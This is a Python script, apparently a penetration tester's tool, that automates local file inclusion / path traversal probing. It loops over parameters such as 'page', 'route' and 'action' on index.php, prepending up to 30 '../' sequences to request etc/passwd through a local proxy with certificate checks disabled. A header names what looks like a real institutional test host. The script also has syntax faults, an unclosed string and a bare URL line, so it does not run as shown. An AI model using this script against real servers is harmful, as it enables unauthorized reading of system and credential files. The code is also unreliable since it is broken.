import httpx
#search for term "REDACTED" for places where you need to modify
proxies= httpx.Proxy(
	url="http://127.0.0.1:8080",
	mode="TUNNEL_ONLY",
	)


client= httpx.Client(proxies=proxies,verify=False)

headers={
"Host": "redcaptest.mskcc.org",
"Cookie": "PHPSESSID=REDACTED",
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate",
"Referer": "REDACTED",
"Upgrade-Insecure-Requests": "1",
"Te": "trailers",
"Connection": "close"

	}



#the target address
baseurl="REDACTED/

#the directory to test
dirs=["REDACTED/","REDACTED/","REDACTED/","REDACTED/"]

#the parameter to test
params=["route","page","action"]

#the file you want to try retrieving windows hosts vs *nix
#https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/
filepath="etc/passwd"#"var/www/html/info.php"

#the potential vulnerable script
vuln="index.php"

#the lfi payload
payload="../"


# simple, send requests to a vuln dir/param of your choice and append ../'s

print("[****] Starting search in %s "%vuln)
for i in range(1,30):
	print("[-] count: %s"%i)
	exploit=payload+filepath
	getr2=client.get(baseurl+vuln+"?page="+exploit,headers=headers,timeout=200)  #page being the param
	payload+="../"


#automate checking dirs, params against a vulnerable page. add a list of vulns and another for loop if you just want to lficheck it all. 
	
print("[****] Starting search in web root")
for dirr in dirs:
	payload="../"
	print("[!] Dir: %s"%dirr)
	for param in params:
		payload="../"
		print("[+] param: %s"%param)
		# http://target.com/scripts/search.php?route=/etc/passwd
		getr=client.get(baseurl+dirr+vuln+"?%s="%param+"/etc/passwd",headers=headers,timeout=200)
		for i in range(1,20):
			exploit=payload+filepath
			print("[+] Trying #%s"%i)
			http://target.com/scripts/search.php?route=../etc/passwd
			getr=client.get(baseurl+dirr+vuln+"?%s="%param+exploit,headers=headers,timeout=200)	

			payload+="../"

